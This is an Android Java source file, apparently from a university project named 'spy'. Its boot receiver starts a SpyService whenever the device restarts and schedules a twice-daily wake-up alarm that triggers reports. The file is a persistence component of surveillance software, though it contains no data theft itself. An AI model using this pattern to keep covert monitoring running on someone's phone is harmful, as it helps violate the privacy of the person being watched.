package edu.uj.jkordas.spy.receiver;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import edu.uj.jkordas.spy.SpyService;
import edu.uj.jkordas.spy.developer.Logger;

public class BootCompletedReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        setReportTrigger(context);
        Intent mServiceIntent = new Intent(context, SpyService.class);
        context.startService(mServiceIntent);
    }

    private void setReportTrigger(Context context) {
        Logger.log(context, "report trigger set");

        Intent intent = new Intent(context, AlarmReceiver.class);
        PendingIntent alarmIntent = PendingIntent.getBroadcast(context, 0, intent, 0);

        AlarmManager alarmMgr = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        alarmMgr.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), AlarmManager.INTERVAL_HALF_DAY,
                alarmIntent);
    }

}
